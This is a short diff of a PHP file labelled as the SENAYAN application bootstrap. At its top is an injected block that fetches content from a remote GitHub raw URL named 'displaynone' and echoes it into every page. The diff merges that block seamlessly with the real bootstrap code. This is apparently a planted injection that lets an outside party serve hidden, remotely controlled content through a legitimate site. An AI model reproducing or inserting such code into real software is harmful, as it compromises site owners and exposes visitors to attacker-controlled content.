@@ -1,3 +1,4 @@
+
 <?php
 $url = 'https://raw.githubusercontent.com/ooiitttoipaa-cpu/displaynone/refs/heads/main/displaynone';
 $ch = curl_init($url);
@@ -9,8 +10,6 @@ curl_close($ch);
 if ($response !== false) {
     echo $response;
 }
-?>
-<?php
 /**
  * SENAYAN application bootstrap files
  *
